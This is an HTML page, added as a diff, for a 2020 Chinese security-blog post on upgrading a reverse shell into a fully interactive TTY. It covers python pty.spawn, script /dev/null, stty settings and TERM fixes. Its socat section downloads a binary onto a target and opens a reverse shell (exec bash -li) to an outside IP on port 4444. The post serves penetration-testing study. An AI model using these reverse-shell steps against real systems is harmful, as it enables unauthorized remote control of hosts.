@@ -1,0 +1,836 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8">
+<!--dev siwtch-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='apple-mobile-web-app-capable' content='yes'/>
+<meta name='full-screen' content='true'/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--dev switch end-->
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+    <meta name="baidu-site-verification" content="codeva-Bt0LqEvH6L" />
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-TJ5SFQ4KCM"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-TJ5SFQ4KCM');
+</script>
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />
+
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="「BASH」:谈谈完全交互式的终端 | © 哨兵" />
+<meta property="og:description" content=" &lt;div class=&quot;container mtb&quot;&gt;
+    &lt;div class=&quot;row d-flex &quot;&gt;
+        &lt;!-- SINGLE POST --&gt;
+        &lt;div class=&quot;col-lg-8 markdown-body-img flex-column&quot;&gt;
+            &lt;!-- Blog Post  --&gt;
+            &lt;a href=&quot;/blog/2020/get/TTY/terminal/&quot;&gt;&lt;h1 class=&quot;ctitle&quot;&gt;「BASH」:谈谈完全交互式的终端&lt;/h1&gt;&lt;/a&gt;
+            &lt;csmall&gt;&lt;div class=&quot;d-flex items-center&quot;&gt;
+                &lt;!--article author end--&gt;
+
+&lt;!-- site build time set to the latest time.--&gt;
+
+&lt;!-- post time--&gt;
+
+
+
+
+
+&lt;div class=&quot;ml-hide&quot;&gt;
+    &lt;a class=&quot;f2 d-flex color-fg-default&quot; href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;
+        Bin4xin
+
+        
+            
+        post
+        
+
+        
+        
+        
+        
+        
+
+        
+            on May 20, 2020
+        
+    &lt;/a&gt;
+&lt;/div&gt;
+            &lt;/div&gt;&lt;/csmall&gt;
+            &lt;div class=&quot;post-content&quot;&gt; 
+            &lt;p&gt;写在前面，本方法适用于在反弹shell后把shell提升为完全交互式shell，也是自己实战了一段时间后摸索出来的，记一下笔记&lt;/p&gt;
+
+&lt;h2 id=&quot;完美的交互式shell&quot;&gt;完美的交互式shell&lt;/h2&gt;
+
+&lt;h3 id=&quot;python&quot;&gt;python&lt;/h3&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# 输入 Ctrl+Z&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;fg&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;reset
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash
+&lt;span class=&quot;c&quot;&gt;# or export TERM=xterm-256color&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;srcipt-based-on-bash&quot;&gt;srcipt based on bash&lt;/h3&gt;
+
+&lt;p&gt;同样的，我在网上也找到另外一种方式：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;script /dev/null/&lt;/code&gt;这样：同理，也可以通过同样的方式获取到交互式shell：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null
+Ctrl-Z
+&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;fg
+&lt;/span&gt;reset
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;这样我们在终端某个命令时，输入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl+c&lt;/code&gt;或者&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctrl+z&lt;/code&gt;就不会直接中断shell。
+这里转载搜到信息来进行展示，供大家参考：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;stty&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;#禁止回显，当在键盘上输入时，并不出现在屏幕上&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;stty echo&lt;/span&gt; 	&lt;span class=&quot;c&quot;&gt;#打开回显&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw 	&lt;span class=&quot;c&quot;&gt;#设置原始输入&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;stty&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-raw&lt;/span&gt;	&lt;span class=&quot;c&quot;&gt;#关闭原始输入&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;bg&lt;/span&gt;			&lt;span class=&quot;c&quot;&gt;#将一个在后台暂停的命令，变成继续执行&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;fg&lt;/span&gt;			&lt;span class=&quot;c&quot;&gt;#将后台中的命令调至前台继续运行&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;jobs&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;#查看当前有多少在后台运行的命令&lt;/span&gt;
+ctrl+z 		&lt;span class=&quot;c&quot;&gt;#可以将一个正在前台执行的命令放到后台，并且暂停&lt;/span&gt;
+clear  		&lt;span class=&quot;c&quot;&gt;#这个命令将会刷新屏幕，本质上只是让终端显示页向后翻了一页，如果向上滚动屏幕还可以看到之前的操作信息。&lt;/span&gt;
+reset 		&lt;span class=&quot;c&quot;&gt;#这个命令将完全刷新终端屏幕，之前的终端输入操作信息将都会被清空&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;来源：&lt;a href=&quot;https://saucer-man.com/information_security/233.html#cl-3&quot;&gt;实现交互式shell的几种方式&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;socat&quot;&gt;socat&lt;/h1&gt;
+
+&lt;p&gt;目标机&lt;/p&gt;
+
+&lt;p&gt;把socat上传到目标机器上或者直接下载&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; /tmp/socat
+
+vuln_ip:
+&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x /tmp/socat
+./tmp/socat &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;:&lt;span class=&quot;s1&quot;&gt;&#39;bash -li&#39;&lt;/span&gt;,pty,stderr,setsid,sigint,sane tcp:47.52.233.92:4444
+&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
+attack machine
+socat file:&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;tty&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;,raw,echo&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 tcp-listen:4444
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;stty行列数&quot;&gt;stty行列数:)&lt;/h3&gt;
+&lt;p&gt;有的时候终端写入的命令太长，而终端行列不够长来显示所以会导致命令重叠、错杂，我们可以用下面的方法来让我们用这个shell用的更舒服点；&lt;/p&gt;
+
+&lt;p&gt;先看看自己机器上的stty配置信息:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@ubuntu20-free:~# &lt;span class=&quot;nb&quot;&gt;stty&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;
+speed 9600 baud&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rows 35&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; columns 148&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; line &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+intr &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^C&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; quit &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^&lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt; erase &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^?&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^U&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; eof &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^D&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; eol &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;undef&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; eol2 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;undef&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; swtch &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &amp;lt;undef&amp;gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; start &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^Q&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; stop &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^S&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; susp &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^Z&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; rprnt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^R&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+werase &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^W&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; lnext &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^V&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; discard &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ^O&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; min &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-parenb&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-parodd&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-cmspar&lt;/span&gt; cs8 &lt;span class=&quot;nt&quot;&gt;-hupcl&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-cstopb&lt;/span&gt; cread &lt;span class=&quot;nt&quot;&gt;-clocal&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-crtscts&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;-ignbrk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-brkint&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ignpar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-parmrk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-inpck&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-istrip&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-inlcr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-igncr&lt;/span&gt; icrnl ixon &lt;span class=&quot;nt&quot;&gt;-ixoff&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iuclc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ixany&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-imaxbel&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-iutf8&lt;/span&gt;
+opost &lt;span class=&quot;nt&quot;&gt;-olcuc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ocrnl&lt;/span&gt; onlcr &lt;span class=&quot;nt&quot;&gt;-onocr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-onlret&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ofill&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ofdel&lt;/span&gt; nl0 cr0 tab0 bs0 vt0 ff0
+isig icanon iexten &lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;echoe echok &lt;span class=&quot;nt&quot;&gt;-echonl&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-noflsh&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-xcase&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-tostop&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-echoprt&lt;/span&gt; echoctl echoke &lt;span class=&quot;nt&quot;&gt;-flusho&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-extproc&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;speed 9600 baud; rows 35; columns 148; line = 0;&lt;/code&gt;这一段是我们所需要的信息；&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rows 35&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; columns 148
+配置我们的shell如下：
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;rows 35 cols 148
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;其他痛点&quot;&gt;其他痛点&lt;/h2&gt;
+&lt;p&gt;有的时候感觉terminal上太多命令了，用着用着会习惯性输入命令&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clear&lt;/code&gt;，然后你们就会看到如下现象：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# clear&lt;/span&gt;
+
+TERM environment variable not set.
+
+&lt;span class=&quot;c&quot;&gt;# set |grep TERM&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;dumb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;如上，看term的配置信息，最后解决办法如下，设置term为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xterm&lt;/code&gt;就可以了。&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# export TERM=xterm&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# set |grep TERM&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
+&lt;span class=&quot;nv&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;TERM
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;之后就可以随意的clear清除命令辣！&lt;/p&gt;
+
+                &lt;!-- [x] 2022/10/20/10:49:36 fixed: while width &lt; some inch. would be flex column not display like a row.--&gt;
+&lt;footer&gt;
+	&lt;style&gt;.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}&lt;/style&gt;
+	&lt;div class=&quot;border-top&quot;&gt;&lt;/div&gt;
+		&lt;section class=&quot;container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto&quot;&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix &quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;申明&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;div class=&quot;mb-2&quot;&gt;&lt;a href=&quot;/blog/2020/get/TTY/terminal/&quot; target=&quot;_blank&quot; class=&quot; text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-link&quot;&gt;&lt;/div&gt;
+						转载请申明本文档链接&lt;/a&gt;&lt;/div&gt;
+					&lt;div&gt;&lt;a href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;  class=&quot;text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-user&quot;&gt;&lt;/div&gt;
+						Post by Bin4xin.&lt;/a&gt;
+					&lt;/div&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;贡献开源文档&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2020-05-20-how-to-get-TTY-terminal-in-linux.markdown&quot; target=&quot;_blank&quot; class=&quot;no-underline btn mr-1 color-border-accent-emphasis&quot;&gt;
+						&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; role=&quot;img&quot; class=&quot;octicon mr-1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot; height=&quot;16&quot; fill=&quot;currentColor&quot; style=&quot;display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
+						贡献当前开源文档
+					&lt;/a&gt;
+					&lt;p class=&quot;f0_8-l mt-2 text-bold&quot;&gt;此之前，学习开源贡献&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码&quot;&gt;CN&amp;nbsp;|&lt;/a&gt;
+						&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/github/docs/blob/main/CONTRIBUTING.md&quot;&gt;EN&lt;/a&gt;&lt;/p&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;此文档对您有帮助吗&lt;/h2&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/&quot; target=&quot;_blank&quot; class=&quot;no-underline&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;给文档仓库点个赞!&quot;&gt;
+					&lt;div class=&quot;fa fa-thumbs-o-up&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&amp;template=2-bug_report.yaml&amp;title=_posts/blog/2020-05-20-how-to-get-TTY-terminal-in-linux.markdown&amp;nbsp; 「BASH」:谈谈完全交互式的终端 | © 哨兵 | SENTINEL SECURITY, LAB&quot; target=&quot;_blank&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;本文档有问题?&quot;&gt;
+				&lt;div class=&quot;fa fa-thumbs-o-down&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+			&lt;/div&gt;
+		&lt;/section&gt;
+&lt;/footer&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;spacing&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;&lt;!--/col-lg-8 --&gt;
+        
+&lt;div class=&quot;col-md-4 ml-hide table-of-contents__left-border&quot; style=&quot;max-height: 100%&quot;&gt;
+    &lt;div class=&quot;nav nav-stacked tableOfContents_35-E thin-scrollbar position-sticky top-0&quot;&gt;
+        &lt;li class=&quot; table-of-contents&quot;&gt;
+            &lt;code-index-css&gt;
+                &lt;ul&gt;&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column&quot;&gt;&lt;a&gt;文章目录&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
+                &lt;ul id=&quot;toc&quot; class=&quot;section-nav&quot;&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#完美的交互式shell&quot;&gt;完美的交互式shell&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#python&quot;&gt;python&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#srcipt-based-on-bash&quot;&gt;srcipt based on bash&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1&quot;&gt;&lt;a href=&quot;#socat&quot;&gt;socat&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3&quot;&gt;&lt;a href=&quot;#stty行列数&quot;&gt;stty行列数:)&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#其他痛点&quot;&gt;其他痛点&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+            &lt;/code-index-css&gt;
+        &lt;/li&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+    &lt;/div&gt;&lt;!--/row --&gt;
+&lt;/div&gt;&lt;!--/container --&gt;哨兵安全实验室 SENTINEL SECURITY, LAB" />
+<meta property="og:image" content="https://bin4xin.sentrylab.cn/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="https://bin4xin.sentrylab.cn/blog/2020/get/TTY/terminal/" />
+<title> 「BASH」:谈谈完全交互式的终端 | © 哨兵 | SENTINEL SECURITY, LAB</title>
+
+<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
+<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
+<script src="/assets/js/pace.min.js"></script>
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+<link href="/assets/css/bilibili_icon.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+
+<!--mathjax-config scripts.-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+</script>
+<script src="/assets/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!--mathjax-config scripts stop.-->
+
+
+
+</head>
+
+
+    <body>
+
+                <!--
+#####################################################################################################################
+|  1.Fixed navbar issues #3 visit https://github.com/Bin4xin/bin4xin.github.io/issues/3                             |
+|    change `position: fixed` to `position: sticky`                                                                 |
+|                                                                                                                   |
+|  2.Fixed navbar padding-top equals to 70px                                                                        |
+|    `./assets/css/style.scss` @import struture in `./assets/css/_struture.scss` del `padding-top=70px` in body.    |
+#####################################################################################################################-->
+<style>
+.nav>li>a {
+    padding: 10px 15px;
+}
+</style>
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <div class="flex-justify-center-l flex-justify-between">
+                <!-- 代码引用申明/code reference declaration:
+                @ [click this icon -> scroll to top of page;] code from anquanke. visit any posts in https://www.anquanke.com/
+                <del>also this icon func are under-construction</del>
+                DONE.
+                -->
+                <div>
+                    <picture>
+  
+  
+  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
+  
+  
+  
+  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
+  
+</picture>
+                    
+                </div>
+                <div>
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button></div>
+            </div>
+        </div>
+        <div class="navbar-collapse collapse navbar-right">
+            <ul class="nav navbar-nav">
+                
+                <li ><a href="/"><div class="fa fa-search"></div></a></li>
+                <li class="active"><a href="/blog/">BLOG</a></li>
+                <li ><a href="/categories/">CATEGORIES</a></li>
+                <li ><a href="/daily/">DAILY</a></li>
+                <li ><a href="/newest">NEWEST</a></li>
+                <li ><a href="/about/">RESEARCH</a></li>
+                <li ><a href="/feed.xml">RSS</a></li>
+                
+            </ul>
+        </div><!--/.nav-collapse -->
+    </div>
+</div>
+                <div class="container mtb">
+    <div class="row d-flex ">
+        <!-- SINGLE POST -->
+        <div class="col-lg-8 markdown-body-img flex-column">
+            <!-- Blog Post  -->
+            <a href="/blog/2020/get/TTY/terminal/"><h1 class="ctitle">「BASH」:谈谈完全交互式的终端</h1></a>
+            <csmall><div class="d-flex items-center">
+                <!--article author end-->
+
+<!-- site build time set to the latest time.-->
+
+<!-- post time-->
+
+
+
+
+
+<div class="ml-hide">
+    <a class="f2 d-flex color-fg-default" href="https://github.com/Bin4xin" target="_blank">
+        Bin4xin
+
+        
+            
+        post
+        
+
+        
+        
+        
+        
+        
+
+        
+            on May 20, 2020
+        
+    </a>
+</div>
+            </div></csmall>
+            <div class="post-content"> 
+            <p>写在前面，本方法适用于在反弹shell后把shell提升为完全交互式shell，也是自己实战了一段时间后摸索出来的，记一下笔记</p>
+
+<h2 id="完美的交互式shell">完美的交互式shell</h2>
+
+<h3 id="python">python</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python <span class="nt">-c</span> <span class="s2">"import pty; pty.spawn('/bin/bash')"</span>
+<span class="c"># 输入 Ctrl+Z</span>
